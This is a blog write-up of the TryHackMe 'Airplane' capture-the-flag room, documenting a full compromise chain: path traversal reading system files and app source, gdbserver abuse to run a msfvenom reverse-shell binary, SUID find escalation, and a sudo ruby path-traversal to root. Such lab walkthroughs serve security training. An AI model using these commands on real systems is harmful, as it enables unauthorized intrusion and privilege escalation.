---
title: "TryHackMe: Airplane"
author: cilgin
date: 2025-07-05 15:57:24 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-07-05-TryHackMe-Airplane/main.svg
---

Hi I'm making TryHackMe [Airplane](https://tryhackme.com/room/airplane) room.

---

```bash
export IP=10.10.77.146
```

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-05 16:01 +0300
Nmap scan report for 10.10.77.146
Host is up (0.070s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
6048/tcp open  x11?
8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.83 seconds
```

It seems we need to add the `airplane.thm` to the `/etc/hosts` file

When we go the the webpage on port 8000 we can see this webpage:

![Desktop View](/assets/img/2025-07-05-TryHackMe-Airplane/photo1.webp){: width="972" height="589" }

Firstly lets fuzz the website using `gobuster`

```bash
❯ gobuster dir -w common.txt -u http://airplane.thm:8000/ -x md,js,html,php,py,css,txt,bak -t 30
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://airplane.thm:8000/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              txt,bak,md,js,html,php,py,css
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```

Http server just serving index.html ok.

When I looking throught site i found that there is page=index.html
Maybe there is a path traversal vuln huh!

```bash
❯ curl 'http://airplane.thm:8000/?page=../../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

Look what I got we can read files.

```bash
❯ curl 'http://airplane.thm:8000/?page=../../../../../etc/group'
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog
tty:x:5:syslog
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:carlos
audio:x:29:pulse
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
systemd-timesync:x:104:
crontab:x:105:
messagebus:x:106:
input:x:107:
kvm:x:108:
render:x:109:
syslog:x:110:
tss:x:111:
bluetooth:x:112:
ssl-cert:x:113:
uuidd:x:114:
tcpdump:x:115:
avahi-autoipd:x:116:
rtkit:x:117:
ssh:x:118:
netdev:x:119:
lpadmin:x:120:
avahi:x:121:
scanner:x:122:saned
saned:x:123:
nm-openvpn:x:124:
whoopsie:x:125:
colord:x:126:
fwupd-refresh:x:127:
geoclue:x:128:
pulse:x:129:
pulse-access:x:130:
gdm:x:131:
sssd:x:132:
lxd:x:133:
carlos:x:1000:
sambashare:x:134:
systemd-coredump:x:999:
hudson:x:1001:
```

There is carlos and hudson user also there is lxd we will probably face some container.

Remember that this webserver is Werkzeug so it should be running some python application.
So we need to find the where is the source code firstly:

```bash
❯ curl 'http://airplane.thm:8000/?page=../../../../../proc/self/status'
Name:	python3
Umask:	0022
State:	S (sleeping)
Tgid:	534
Ngid:	0
Pid:	534
PPid:	1
TracerPid:	0
Uid:	1001	1001	1001	1001
Gid:	1001	1001	1001	1001
FDSize:	128
Groups:	1001
NStgid:	534
NSpid:	534
NSpgid:	534
NSsid:	534
VmPeak:	1211744 kB
VmSize:	1056308 kB
VmLck:	      0 kB
VmPin:	      0 kB
VmHWM:	  29384 kB
VmRSS:	  29288 kB
RssAnon:	  19676 kB
RssFile:	   9612 kB
RssShmem:	      0 kB
VmData:	  52928 kB
VmStk:	    132 kB
VmExe:	   2772 kB
VmLib:	   5156 kB
VmPTE:	    196 kB
VmSwap:	      0 kB
HugetlbPages:	      0 kB
CoreDumping:	0
THP_enabled:	1
Threads:	2
SigQ:	2/3643
SigPnd:	0000000000000000
ShdPnd:	0000000000000000
SigBlk:	0000000000000000
SigIgn:	0000000001001000
SigCgt:	0000000180000002
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000
NoNewPrivs:	0
Seccomp:	0
Speculation_Store_Bypass:	vulnerable
Cpus_allowed:	3
Cpus_allowed_list:	0-1
Mems_allowed:	00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
Mems_allowed_list:	0
voluntary_ctxt_switches:	173414
nonvoluntary_ctxt_switches:	17905
```

Which is running as 1001 (hudson) user.

Now lets look at the cmdline.

```bash
❯ curl -s 'http://airplane.thm:8000/?page=../../../../proc/self/cmdline' | sed 's/\x00/ /g'
/usr/bin/python3 app.py %
```

Yes I was right bro is runnig some python application.
Now lets get the source code:

```bash
❯ curl -s 'http://airplane.thm:8000/?page=../../../../proc/self/cwd/app.py'
```

```python
from flask import Flask, send_file, redirect, render_template, request
import os.path

app = Flask(__name__)


@app.route('/')
def index():
    if 'page' in request.args:
        page = 'static/' + request.args.get('page')

        if os.path.isfile(page):
            resp = send_file(page)
            resp.direct_passthrough = False

            if os.path.getsize(page) == 0:
                resp.headers["Content-Length"]=str(len(resp.get_data()))

            return resp

        else:
            return "Page not found"

    else:
        return redirect('http://airplane.thm:8000/?page=index.html', code=302)


@app.route('/airplane')
def airplane():
    return render_template('airplane.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)%
```

Now we get the source code.

Let's inspect the code first:

There is nothing we can use. Just the path traversal vulnerable python code.

Let's look at the tcp connections:

```bash
❯ curl -s 'http://airplane.thm:8000/?page=../../../../proc/net/tcp'
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 16163 1 0000000000000000 100 0 0 10 0
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 19114 1 0000000000000000 100 0 0 10 0
   2: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 18530 1 0000000000000000 100 0 0 10 0
   3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21651 1 0000000000000000 100 0 0 10 0
   4: 00000000:17A0 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21091 1 0000000000000000 100 0 0 10 0
   5: 924D0A0A:B5A2 54E5FD03:01BB 02 00000001:00000000 01:00000481 00000004     0        0 71191 2 0000000000000000 1600 0 0 1 7
   6: 924D0A0A:1F40 80CE150A:D82E 01 00000000:00000000 00:00000000 00000000  1001        0 71193 1 0000000000000000 27 4 30 10 -1
```

3, 4 and 6 is running by 1001 (hudson). Lets look at the ports of this processes.

But firstly we need to make the text readable. So I used AI to generate a script which makes this here is the script:

```python
import socket

tcp_states = {
    '01': 'ESTABLISHED',
    '02': 'SYN_SENT',
    '03': 'SYN_RECV',
    '04': 'FIN_WAIT1',
    '05': 'FIN_WAIT2',
    '06': 'TIME_WAIT',
    '07': 'CLOSE',
    '08': 'CLOSE_WAIT',
    '09': 'LAST_ACK',
    '0A': 'LISTEN',
    '0B': 'CLOSING',
    '0C': 'NEW_SYN_RECV'
}

def hex_to_ip(hex_ip):
    # 0100007F → 7F 00 00 01 → 127.0.0.1
    ip_bytes = bytes.fromhex(hex_ip)
    return socket.inet_ntoa(ip_bytes[::-1])

def hex_to_port(hex_port):
    return int(hex_port, 16)

# Paste the data here
raw_data = """
   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 16163 1 0000000000000000 100 0 0 10 0
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 19114 1 0000000000000000 100 0 0 10 0
   2: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 18530 1 0000000000000000 100 0 0 10 0
   3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21651 1 0000000000000000 100 0 0 10 0
   4: 00000000:17A0 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21091 1 0000000000000000 100 0 0 10 0
   5: 924D0A0A:1F40 80CE150A:87E2 01 00000000:00000000 00:00000000 00000000  1001        0 71212 1 0000000000000000 27 4 28 10 -1
"""

lines = raw_data.strip().split('\n')[1:]

for line in lines:
    parts = line.split()
    local_ip_hex, local_port_hex = parts[1].split(':')
    remote_ip_hex, remote_port_hex = parts[2].split(':')
    state_hex = parts[3]

    local_ip = hex_to_ip(local_ip_hex)
    local_port = hex_to_port(local_port_hex)
    remote_ip = hex_to_ip(remote_ip_hex)
    remote_port = hex_to_port(remote_port_hex)
    state = tcp_states.get(state_hex, "UNKNOWN")

    print(f"{local_ip}:{local_port} -> {remote_ip}:{remote_port} [{state}]")
```

```bash
❯ python proc_net_tcp-to-normal.py
0.0.0.0:22 -> 0.0.0.0:0 [LISTEN]
127.0.0.1:631 -> 0.0.0.0:0 [LISTEN]
0.0.0.0:8000 -> 0.0.0.0:0 [LISTEN]
0.0.0.0:6048 -> 0.0.0.0:0 [LISTEN]
10.10.77.146:8000 -> 10.21.206.128:34786 [ESTABLISHED]
```

The last process sending me some packages. Also there is 0.0.0.0:6648 port is open.
Also we can see that with nmap scan.

I play with this port a while but I didn't found anything.

Maybe we can try to list processes using web server.

Since we can't run `ps` in the target. We can try to read `/proc/${number}/cmdline` lets use a bash script for this.

```bash
#!/usr/bin/env bash

for i in {1..800}; do
  out=$(curl -s "http://airplane.thm:8000/?page=../../../../../proc/$i/cmdline" | sed 's/\x00/ /g' | grep -v 'Page not found')
  if [ -n "$out" ]; then
    echo "$i : $out"
  fi
done
```

I changed the i to max 800 beacause you don't need that much.

```bash
❯ bash get-process.sh
1 : /sbin/init splash
222 : /lib/systemd/systemd-journald
262 : /lib/systemd/systemd-udevd
292 : /lib/systemd/systemd-networkd
299 : /lib/systemd/systemd-timesyncd
304 : /lib/systemd/systemd-resolved
308 : /lib/systemd/systemd-timesyncd
363 : /usr/lib/accountsservice/accounts-daemon
364 : /usr/sbin/acpid
367 : avahi-daemon: running [airplane.local]
368 : /usr/sbin/cron -f
370 : /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
372 : /usr/sbin/NetworkManager --no-daemon
381 : /usr/sbin/irqbalance --foreground
383 : /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
384 : /usr/lib/policykit-1/polkitd --no-debug
387 : /usr/sbin/rsyslogd -n -iNONE
389 : /usr/lib/snapd/snapd
390 : /usr/libexec/switcheroo-control
392 : /lib/systemd/systemd-logind
393 : /usr/lib/udisks2/udisksd
394 : /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
411 : /usr/sbin/irqbalance --foreground
432 : avahi-daemon: chroot helper
439 : /usr/sbin/rsyslogd -n -iNONE
440 : /usr/sbin/rsyslogd -n -iNONE
441 : /usr/sbin/rsyslogd -n -iNONE
442 : /usr/lib/accountsservice/accounts-daemon
443 : /usr/lib/policykit-1/polkitd --no-debug
444 : /usr/libexec/switcheroo-control
466 : /usr/lib/udisks2/udisksd
476 : /usr/sbin/cupsd -l
486 : /usr/lib/snapd/snapd
487 : /usr/lib/snapd/snapd
488 : /usr/lib/snapd/snapd
489 : /usr/lib/snapd/snapd
490 : /usr/libexec/switcheroo-control
492 : /usr/lib/policykit-1/polkitd --no-debug
493 : /usr/lib/udisks2/udisksd
494 : /usr/lib/accountsservice/accounts-daemon
495 : /usr/sbin/cups-browsed
516 : /usr/sbin/ModemManager
519 : /usr/sbin/cups-browsed
520 : /usr/sbin/cups-browsed
526 : /usr/sbin/NetworkManager --no-daemon
527 : /usr/sbin/NetworkManager --no-daemon
532 : /usr/bin/gdbserver 0.0.0.0:6048 airplane
534 : /usr/bin/python3 app.py
537 : /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
544 : /usr/sbin/ModemManager
545 : /usr/lib/udisks2/udisksd
551 : sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
552 : /usr/bin/amazon-ssm-agent
555 : /usr/bin/whoopsie -f
560 : /usr/sbin/ModemManager
566 : /usr/lib/udisks2/udisksd
570 : /opt/airplane
571 : /usr/sbin/kerneloops --test
573 : /usr/sbin/kerneloops
574 : /usr/bin/whoopsie -f
575 : /usr/bin/whoopsie -f
578 : /usr/lib/snapd/snapd
579 : /usr/lib/snapd/snapd
580 : /usr/lib/snapd/snapd
603 : /usr/bin/amazon-ssm-agent
604 : /usr/bin/amazon-ssm-agent
605 : /usr/bin/amazon-ssm-agent
606 : /usr/bin/amazon-ssm-agent
624 : /usr/bin/amazon-ssm-agent
625 : /usr/bin/amazon-ssm-agent
626 : /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
627 : /usr/bin/amazon-ssm-agent
646 : /usr/sbin/gdm3
657 : /usr/sbin/gdm3
658 : /usr/sbin/gdm3
666 : /lib/systemd/systemd --user
667 : (sd-pam)
675 : /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
680 : /usr/libexec/rtkit-daemon
681 : /usr/libexec/rtkit-daemon
682 : /usr/libexec/rtkit-daemon
712 : gdm-session-worker [pam/gdm-launch-environment]
715 : gdm-session-worker [pam/gdm-launch-environment]
716 : gdm-session-worker [pam/gdm-launch-environment]
722 : /usr/lib/gdm3/gdm-x-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
728 : /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
731 : /usr/lib/gdm3/gdm-x-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
732 : /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/126/gdm/Xauthority -background none -noreset -keeptty -verbose 3
737 : /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/126/gdm/Xauthority -background none -noreset -keeptty -verbose 3
738 : /usr/lib/gdm3/gdm-x-session dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
740 : dbus-run-session -- gnome-session --autostart /usr/share/gdm/greeter/autostart
741 : dbus-daemon --nofork --print-address 4 --session
742 : /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart
746 : /usr/libexec/at-spi-bus-launcher
747 : /usr/libexec/at-spi-bus-launcher
748 : /usr/libexec/at-spi-bus-launcher
750 : /usr/libexec/at-spi-bus-launcher
751 : /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
764 : /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart
765 : /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart
768 : /usr/libexec/gnome-session-binary --systemd --autostart /usr/share/gdm/greeter/autostart
```

There is whoopsie binary and
Also in 532th line gdbserver is running.
532 : /usr/bin/gdbserver 0.0.0.0:6048 airplane

Finally I can use this port to get reverse shell.

Firstly connect to the gdbserver using:

```bash
❯ gdb
(gdb) target remote 10.10.77.146:6048
```

We firstly need to generate reverse shell binary using metasploit. I like to use docker to make that binary.

```bash
❯ docker run --rm -it -v $PWD:/data parrotsec/metasploit
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v6.4.58-dev                          ]
+ -- --=[ 2511 exploits - 1292 auxiliary - 431 post       ]
+ -- --=[ 1607 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

me[msf](Jobs:0 Agents:0) >>
```

```bash
[msf](Jobs:0 Agents:0) >> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.21.206.128 LPORT=4444 PrependFork=true -f elf -o binary.elf
[*] exec: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.21.206.128 LPORT=4444 PrependFork=true -f elf -o binary.elf

Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: binary.elf
[msf](Jobs:0 Agents:0) >> ls
[*] exec: ls

binary.elf
```

Now we can use that binary to get reverse shell.

```bash
❯ gdb
Remote debugging using airplane.thm:6048
(gdb)
```

```bash
(gdb) target extended-remote airplane.thm:6048
Remote debugging using airplane.thm:6048
(gdb) remote put binary.elf /tmp/binary.elf
Successfully sent file "binary.elf".
(gdb) set remote exec-file /tmp/binary.elf
(gdb) r
Starting program:
Reading /tmp/binary.elf from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /tmp/binary.elf from remote target...
Reading symbols from target:/tmp/binary.elf...
(No debugging symbols found in target:/tmp/binary.elf)

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.archlinux.org>
Enable debuginfod for this session? (y or [n]) y
Debuginfod has been enabled.
To make this setting permanent, add 'set debuginfod enabled on' to .gdbinit.
[Detaching after fork from child process 46409]
[Inferior 1 (process 46408) exited normally]
(gdb)
```

And I got the reverse shell lets quickly upgrade that shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
# 
stty raw -echo;fg
reset
```

```bash
hudson@airplane:/opt$ whoami
hudson
```

```bash
hudson@airplane:/home$ find / -type f -perm /4000 2>/dev/null
/usr/bin/find
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/su
/usr/bin/vmware-user-suid-wrapper
/usr/bin/mount
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
```

What find has suid. Lets go to the <https://gtfobins.github.io/gtfobins/find/>

And use command

```bash
hudson@airplane:/tmp$ find . -exec /bin/sh -p \; -quit
$ whoami
carlos
```

```bash
$ ls -la
total 80
drwxr-x--- 16 carlos carlos 4096 Apr 17  2024 .
drwxr-xr-x  4 root   root   4096 Apr 17  2024 ..
lrwxrwxrwx  1 root   root      9 Apr 17  2024 .bash_history -> /dev/null
-rw-r--r--  1 carlos carlos  220 Apr 17  2024 .bash_logout
-rw-r--r--  1 carlos carlos 3771 Apr 17  2024 .bashrc
drwxrwxr-x 13 carlos carlos 4096 Apr 17  2024 .cache
drwx------ 11 carlos carlos 4096 Apr 17  2024 .config
drwx------  3 carlos carlos 4096 Apr 17  2024 .gnupg
drwxr-xr-x  3 carlos carlos 4096 Apr 17  2024 .local
drwx------  4 carlos carlos 4096 Apr 17  2024 .mozilla
-rw-r--r--  1 carlos carlos  807 Apr 17  2024 .profile
drwx------  2 carlos carlos 4096 Apr 17  2024 .ssh
-rw-r--r--  1 carlos carlos    0 Apr 17  2024 .sudo_as_admin_successful
drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Desktop
drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Documents
drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Downloads
drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Music
drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Pictures
drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Public
drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Templates
drwxr-x---  2 carlos carlos 4096 Apr 17  2024 Videos
-rw-rw-r--  1 carlos carlos   33 Apr 17  2024 user.txt
$ cat user.txt
*******************************
```

But I don't want to upgrade shell this time lets add out ssh public key and connect using ssh.

```bash
❯ ssh carlos$IP
carlos@airplane:~$
```

```bash
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

We can use path traversal on this too.

Firstly make a ruby code which gives shell.

```bash
carlos@airplane:~$ echo 'exec "/bin/sh"' > /tmp/shell.rb
carlos@airplane:~$ sudo /usr/bin/ruby /root/../tmp/shell.rb
whoami
root
ls /root
root.txt  snap
cat /root/root.txt
190dcbeb688ce5fe029f26a1e5fce002
```

Nothing we can use I think.
